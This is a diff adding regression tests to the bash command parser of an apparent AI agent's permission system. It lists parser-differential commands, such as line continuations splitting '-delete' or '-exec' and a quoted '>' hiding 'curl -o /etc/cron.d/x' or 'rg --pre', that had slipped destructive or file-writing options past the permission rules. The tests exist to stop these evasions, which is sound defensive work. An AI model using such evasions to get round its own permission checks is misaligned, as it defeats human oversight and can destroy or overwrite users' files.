@@ -166,3 +166,28 @@ def test_quote_removal_gives_literal_words() -> None:
     parsed = parse_bash('ls \'a b\' "c\\"d" e\\ f')
     assert parsed.refusal is None
     assert parsed.top_level[0].words == ("ls", "a b", 'c"d', "e f")
+
+
+# FRE-1574 self-review: two parser differentials that hid an option from the option rules.
+_REVIEW_BYPASSES = [
+    "find . -dele\\\nte",  # bash joins a continuation inside a word: -delete
+    "find . -exe\\\nc rm x \;",  # -exec
+    "curl -\\\no /etc/x http://h",  # -o to a non-scratch file
+    "find . '>' -delete",  # a quoted '>' dropped the next word from the option rules
+    "curl http://example.com/x '>' -o /etc/cron.d/x",
+    "git log '>' --output=/etc/x",
+    "rg '>' --pre ./s pat",
+]
+
+
+@pytest.mark.parametrize("command", _REVIEW_BYPASSES)
+def test_review_bypasses_ask_under_production_rules(command: str) -> None:
+    from personal_agent.governance.permissions import load_permission_rules
+
+    rules = load_permission_rules()
+    assert evaluate_permission("bash", {"command": command}, "NORMAL", rules).decision == "ask"
+
+
+def test_a_continuation_between_words_is_still_allowed() -> None:
+    rules = PermissionRules(allow=(parse_rule("bash(curl *)"),))
+    assert _decision("curl -s \\\n  -H 'A: b' http://h", rules) == "allow"
